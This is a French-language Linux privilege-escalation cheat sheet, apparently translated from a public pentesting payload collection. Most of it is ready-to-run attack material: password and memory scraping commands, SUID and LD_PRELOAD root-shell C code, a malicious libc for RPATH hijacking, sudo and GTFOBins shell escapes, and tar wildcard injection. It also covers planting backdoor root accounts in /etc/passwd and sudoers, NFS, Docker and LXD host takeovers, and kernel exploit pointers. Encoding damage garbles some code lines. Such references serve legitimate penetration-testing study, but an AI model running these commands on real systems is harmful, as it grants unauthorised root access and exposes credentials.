## Sommaire

* [Outils](#outils)
* [Checklist](#checklists)
* [Récupération de mots de passe](#recuperation-de-mots-de-passe)
    * [Fichiers contenant des mots de passe](#fichiers-contenant-des-mots-de-passe)
    * [Anciens mots de passe dans /etc/security/opasswd](#anciens-mots-de-passe-dans-etcsecurityopasswd)
    * [Derniers fichiers édités](#dernier-fichiers-edites)
    * [Mots de passe en mémoire](#mots-de-passe-en-memoire)
    * [Trouver des fichiers sensibles](#trouver-les-fichiers-sensibles)
* [Tâches planifiées](#taches-planifiees)
    * [Cron jobs](#cron-jobs)
    * [Systemd timers](#systemd-timers)
* [SUID](#suid)
    * [Trouver les binaires SUID](#trouver-les-binaires-suid)
    * [Créer un binaire SUID](#créer-un-binaire-suid)
* [Capacités](#capacites)
    * [Lister les capacités des binaires](#lister-les-capacites-des-binaires)
    * [Editer les capacités](#editer-les-capacites)
    * [Capacités interessantes](#capacties-interessantes)
* [SUDO](#sudo)
    * [NOPASSWD](#nopasswd)
    * [LD_PRELOAD et NOPASSWD](#ld_preload-et-nopasswd)
    * [Doas](#doas)
    * [sudo_inject](#sudo-inject)
* [GTFOBins](#gtfobins)
* [Wildcard](#wildcard)
* [Fichiers avec les droits en écriture](#fichiers-avec-les-droits-en-ecriture)
    * [/etc/passwd avec les permissions en écriture](#etcpasswd-avec-les-permissions-en-ecriture)
    * [/etc/sudoers en écriture](#etcsudoers-avec-les-permissions-en-ecriture)
* [Ecrasement des données NFS Root](#ecrasement-des-données-nfs-root)
* [Librarys partagées](#librarys-partagées)
    * [ldconfig](#ldconfig)
    * [RPATH](#rpath)
* [Groupes](#groupes)
    * [Docker](#docker)
    * [LXC/LXD](#lxclxd)
* [Exploit de kernel](#exploits-kernel)
    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)



## Outils

- [LinuxSmartEnumeration - Un outil d'énumération Linux pour le pentesting et les CTFs](https://github.com/diego-treitos/linux-smart-enumeration)

    ```powershell
    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
    ./lse.sh -l1 # shows interesting information that should help you to privesc
    ./lse.sh -l2 # dump all the information it gathers about the system
    ```

- [LinEnum - Enumération scriptée Linux locale & vérification des escalades de privilèges](https://github.com/rebootuser/LinEnum)
    
    ```powershell
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    ```

- [BeRoot - Un projet autour de l'escalade de privilège - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [linuxprivchecker.py - Un script Linux qui vérifie si l'escalade de privilège est possible](https://github.com/sleventyeleven/linuxprivchecker)
- [unix-privesc-check - Exporté automatiquement depuis code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
- [Escalade de privilèges avec sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)


## Checklists

* Date de sortie du kernel et de la distribution
* Informations système:
  * Hostname
  * Détails du réseau:
  * IP actuelle
  * Détails de la route par défaut
  * Informations sur le serveur DNS
* Informations utilisateur:
  * Détails sur l'utilisateur actuel
  * Dernière connexion des utilisateurs
  * Montrer les utilisateurs connectés sur la machine
  * Liste tous les utilisateurs y compris les informations uid/gid
  * Liste les comptes root
  * Extraire les policies de mots de passe et la méthode de stockage des hases
  * Vérifier la valeur de umask
  * Vérifier si les hases de mots de passe sont stockés dans /etc/passwd
  * Extraire tous les détails pour le uid (user id) par 'défaut' comme par exemple 0,1000, 1001, etc...
  * Essayer de lire les fichiers restreints (comme /etc/shadow)
  * Lister les fichiers d'historique pour l'utilisateur actuel (par exemple .bash_history, .nano_history, .mysql_history, etc...)
  * Vérifications SSH basiques
* Accès priviliégiés:
  * Quels utilisateurs ont récemment utilisé sudo
  * Déterminer si /etc/sudoers est accessible
  * Déterminer si l'utilisateur actuel a un accès sudo sans mot de passe
  * Déterminer si les 'bons' binaires de rupture (ici les binaires permettant de 'briser' les restrictions utilisateur) sont disponibles via sudo (ex: map, vim, etc...)
  * Déterminer si le répertoire root est accessible
  * Lister les permissions pour /home
* Environmental:
  * Afficher le $PATH actuel
  * Afficher les informations env
* Jobs/Tâches:
  * Lister tous les cron jobs
  * Localiser tous les world-writable cron jobs
  * Localiser les cron jobs possédés par d'autres utilisateurs du système
  * Lister tous les tiers systemd actifs ou non
* Services:
  * Lister toutes les connections réseau (TCP & UDP)
  * Lister tous les processus en cours d'exécution
  * Consulter et lister les binaires de processus et leurs permissions associées
  * Lister le contenu de inetd.conf/xined.conf et les permissions de binaires associées
  * Lister les permissions du binaire init.d
* La version des services/commandes suivantes:
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * Vérifier la configuration utilisateur
    * Consulter les modules activés
    * Vérifier les fichiers htpasswd
    * Consulter le répertoire www
* Mots de passes faibles/par défaut:
  * Vérifier les comptes Postgres faibles/par défaut
  * Vérifier les comptes MySQL faibles/par défaut
* Recherches:
  * Localiser tous les fichiers SUID/GUID
  * Localiser tous les fichiers SUID/GUID world-writable
  * Localiser tous les fichiers SUID/GUID possédés par root
  * Localiser les fichiers SUID/GUID 'intéressants' (par exmple: nmap, vim etc)
  * Localiser tous les fichiers avec les capacités POSIX
  * Lister tous les fichiers world-writable
  * Trouver/lister tous les fichiers *.plan et consulter le contenu
  * Trouver/lister tous les fichiers *.rhosts et consulter le contenu
  * Consulter les détails du serveur NFS
  * Localiser les fichiers *.conf et *.log contenant les mots-clés fournis au moment de l'exécution du script
  * Lister tous les fichiers *.conf localisés dans /etc
  * Localiser les mails
* Tests spécifiques selon la platforme/le logiciel:
  * Vérifier si on est dans un container Docker
  * Vérifier si l'hôte a Docker d'installé
  * Vérifier si on est dans un container LXC

## Récupération de mots de passe

### Fichiers contenant des mots de passe

```powershell
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null ;
```

### Anciens mots de passe dans /etc/security/opasswd

Le fichier `/etc/security/opasswd` est aussi utilisé par pam_cracklib pour garder l'historique des anciens mots de passe pour que l'utilisateur ne les réutilise pas

:warning: Considérez votre fichier opasswd comme votre fichier /etc/shadow puisqu'il finira par contenir les hashs de mot de passe utilisateurs 


### Derniers fichiers édités

Fichiers édités dans les 10 dernières minutes

```powershell
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

### Mots de passe en mémoire

```powershell
strings /dev/mem -n10 | grep -i PASS
```

### Trouver les fichiers sensibles

```powershell
$ locate password | more           
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
...
```

## Tâches planifiées

### Cron jobs

Vérifier si on a accès à ces fichiers avec les droits en écriture   
Vérifier l'intérieur du fichier, pour trouver d'autres chemins de fichiers avec les droits en écriture

```powershell
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

Vous pouvez utiliser [pspy](https://github.com/DominicBreuker/pspy) pour détecter un CRON job.

```powershell
# Montre les commandes et les évènements file system puis scan profs toutes les 1000 ms (=1 sec)
./pspy64 -pf -i 1000 
```


## Systemd timers

```powershell
systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
```

## SUID

SUID/Setuid veut dire "set user ID upon execution" (en fran'e7ais définir l'ID utilisateur lors de l'exécution), c'est activé par défaut dans toutes les distribs Linux. Si un fichier avec ce bit est lancé, l'uid sera changé par celui de son possesseur. Si son possesseur est `root`, l'uid sera changé en `root` même s'il a été exécuté depuis l'utilisateur `bob`. Le bit SUID est représenté avec un `s`.

```powershell

f1 'a8'71'a9'a4
f0 swissky@lab ~  

f1 'a8'74'a9'a4
f0 $ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```

### Trouver les binaires SUID

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null ;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### Créer un binaire SUID

```bash
print 'int main(void){nsetresuid(0, 0, 0);nsystem("/bin/sh");n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```


## Capacités

### Lister les capacités des binaires

```bash

f1 'a8'71'a9'a4
f0 swissky@lab ~  

f1 'a8'74'a9'a4
f0 $ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

### Editer les capacités

```powershell
/usr/bin/setcap -r /bin/ping            # supprime
/usr/bin/setcap cap_net_raw+p /bin/ping # ajoute
```

### Capacités intéressantes

Avoir la capacité =ep veut dire que le binaire a toutes les capacités.
```powershell
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

En alternative, on peut utiliser les capacités suivantes pour upgrade nos privilèges actuels.

```powershell
cap_dac_read_search # pouvoir lire n'importe quoi
cap_setuid+ep # setuid
```

Exemple d'escalade de privilèges avec `cap_setuid+ep`

```powershell
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

| Nom de la capacité  | Description |
|---|---|
| CAP_AUDIT_CONTROL  | Autorise l'activation/désactivation de l'audit du kernel |
| CAP_AUDIT_WRITE  | Aide à écrire les enregistrements dans les logs de l'audit du kernel |
| CAP_BLOCK_SUSPEND  | Cette fonctionnalité peut bloquer les suspensions du système   |
| CAP_CHOWN  | Autorise l'utilisateur à faire des modifications arbitraires aux fichiers UIDs et GIDs |
| CAP_DAC_OVERRIDE  | Aide à contourner les vérifications des permissions de lecture, d'écriture ou d'exécution |
| CAP_DAC_READ_SEARCH  | Contourne uniquement les vérifications de permissions de lecture/d'exécution des fichiers et des répertoire  |
| CAP_FOWNER  | Permet de contourner les contrôles d'autorisation sur les opérations qui exigent normalement que l'UID du système de fichiers du processus corresponde à l'UID du fichier  |
| CAP_KILL  | Autorise l'envoi de signaux à des processus appartenants à d'autres  |
| CAP_SETGID  | Autorise le changement du GID  |
| CAP_SETUID  | Autorise la changement de l'UID  |
| CAP_SETPCAP  | Aide au transfert et à la suppression du paramètre actuel à n'importe quel PID |
| CAP_IPC_LOCK  | Aide à bloquer la mémoire  |
| CAP_MAC_ADMIN  | Autorise la modification de la configuration ou de l'état MAC  |
| CAP_NET_RAW  | Utilise des sockets RAW et PACKET |
| CAP_NET_BIND_SERVICE  | SERVICE lie un socket aux ports privilégiés du domaine internet  |

## SUDO
Outil: [Exploitation sudo](https://github.com/TH3xACE/SUDO_KILLER)

### NOPASSWD

La configuration sudo pourrait autoriser un utilisateur à exécuter des commandes avec d'autres privilèges utilisateurs sans connaître leur mot de passe.

```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Dans cet exemple l'utilisateur `demo` peut lancer `vim` en tant que `root`, il est donc maintenant simple d'obtenir un shell en ajoutant une clé ssh dans le répertoire root ou en utilisant `sh`.

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

### LD_PRELOAD et NOPASSWD

Si `LD_PRELOAD` est défini explicitement dans le fichiers des sudoers

```powershell
Defaults        env_keep += LD_PRELOAD
```

Compile les objets partagés suivant en utilisant le code C ci-dessous avec `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```powershell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Exécute n'importe quel binaire avec LD_PRELOAD pour faire spawn un shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

### Doas

Il existe certaines alternatives au binaire `sudo` comme `doas` pour OpenBSD, n'oubliez pas de vérifier sa configuration dans `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
```

### sudo_inject

On utilise [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

```powershell
$ sudo whatever
[sudo] password for user:    
# Pressez <ctrl>+c puisque vous n'avez pas le mot de passe. 
# Cela crée un token sudo invalide.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # pas de mot de passe requis :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

Diapos de présentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)

## GTFOBins

[GTFOBins](https://gtfobins.github.io) est une liste de conservation des binaires Unix qui peut être utilisé par un attaquant pour contourner les restrictions de sécurité locales.

Le projet collecte les fonctions légitimes des binaires d'Unix dont on peut se servir pour sortir d'un shell restreint, pour escalader ou maintenir des privilèges élevés, transférer des fichiers, faire spawn des bine et des reverse shells, et faciliter d'autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit    
> sudo mysql -e '! /bin/sh'    
> strace -o /dev/null /bin/sh    
> sudo awk 'BEGIN {system("/bin/sh")}'


## Wildcard

En utilisant tar avec l'option --checkpoint-action, un action spécifique peut être exécutée après un checkpoint. Cette action pourrait être un script malicieux utilisé pour exécuter des commandes sous l'utilisateur qui démarre tar. 'Piéger' root pour utiliser cette option spécifique est plutôt simple, et c'est ici que les wildcard deviennent intéressantes.

```powershell
# Créer un fichier pour l'exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#!/bin/bashncat /etc/passwd > /tmp/flagnchmod 777 /tmp/flag" > shell.sh

# Script vulnérable
tar cf archive.tar *
```

Outil: [wildpwn](https://github.com/localh0t/wildpwn)

## Fichiers avec les droits en écriture

Lister tous les fichiers avec les droits en écriture sur le système.

```powershell
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} ; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### /etc/passwd avec les permissions en écriture

On génère d'abord un mot de passe avec la commande suivante.

```powershell
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

On ajoute ensuite l'utilisateur `hacker` et on ajoute le mot de passe généré.

```powershell
hacker:MOT_DE_PASE_GENERE:0:0:Hacker:/root:/bin/bash
```

Exemple: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

On peut désormais utiliser la commande `su` avec `hacker:hacker`

En alternative, on peut utiliser les lignes suivantes pour ajouter un utilisateur 'débile' sans mot de passe.
:warning: Vous pouvez dégrader la sécurité de la machine

```powershell
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: Sur les plateformes BSD `/etc/passwd` est situé dans `/etc/pwd.db` et `/etc/master.passwd`. Le `/etc/shadow` est également renommé en `/etc/spwd.db`. 

### /etc/sudoers avec les permissions en écriture

```powershell
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# On utilise sudo sans mot de passe :)
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## Ecrasement des données NFS Root

quand **no_root_squash** apparaît dans `/etc/exports`, le fichier est partageable est un utilisateur distant peut le monter.

```powershell
# On vérifier le nom du dossier à distance
showmount -e 10.10.10.10

# On crée un répertoire
mkdir /tmp/nfsdir  

# Et on le monte 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# On copie le shell que l'on souhaite 
cp /bin/bash . 	

# On définie la permission SUID
chmod +s bash 	
```

## Librarys partagées

### ldconfig

Identifier les librarys partagées avec `ldd`

```powershell
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

On crée library dans `/tmp` (on possède les droits d'écritures ici) et on active le chemin de fichiers.

```powershell
gcc '96Wall '96fPIC '96shared '96o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

### RPATH

```powershell
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée ici par le programme comme spécifié dans la variable `RPATH`.

```powershell
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

On crée ensuite une lib malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```powershell
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Groupes

### Docker

On le système de fichiers dans un conteneur bash, nous autorisant à éditer `/etc/passwd` en tant que root, on ajoute ensuite le compte backdoor `toor:password`.

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

Presque similaire mais vous verrez aussi des processus lancés sur l'hôte et connectés sur les mêmes NICs.

```powershell
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

Ou utilisez l'image docker suivante de [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) pour faire spawn un shell root.

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

Plus d'escalade de privilèges en utilisant le cocker Docker.

```powershell
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### LXC/LXD

privesc requiert le lancement d'un conteneur avec des privilèges élevés et le montage du système de fichiers de l'hôte à l'intérieur.

```powershell

f1 'a8'71'a9'a4
f0 swissky@lab ~  

f1 'a8'74'a9'a4
f0 $ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
```

On crée une image Alpine et on la démarre en utilisant `security.privileged=true`, obligeant le conteneur à interagir en tant que root avec le système de fichiers de l'hôte.

```powershell
# On crée une image Alpine simple
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# On importe l'image
lxc image import ./alpine.tar.gz --alias myimage

# On lance l'image
lxc init myimage mycontainer -c security.privileged=true

# On monte le /root à l'intérieur de l'image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# On interagit avec le conteneur
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

En alternative, https://github.com/initstring/lxd_root

## Exploits Kernel

On peut trouver des exploits pré-compilés dans ces repos, utilisez-les à vos risques et périls !
* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)

Les exploits suivants sont connus pour le bon fonctionnement. Vous pouvez chercher d'autres exploits en utilisant `searchsploit -w linux kernel centos`.

### CVE-2016-5195 (DirtyCow)

Escalade de privilèges (Kernel Linux < 3.19.0-73.8)

```powershell
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

Exploit RDS Linux  (Kernel Linux < 2.6.36-rc8)

```powershell
https://www.exploit-db.com/exploits/15285/
```

### CVE-2010-4258 (Full Nelson)

Kernel Linux 2.6.37 (RedHat / Ubuntu 10.04)

```powershell
https://www.exploit-db.com/exploits/15704/
```

### CVE-2012-0056 (Mempodipper)

Kernel Linux 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

```powershell
https://www.exploit-db.com/exploits/18411
```


## Références

- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
- [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)

Traduit par ze4lk
Texte original de swisskyrepo
}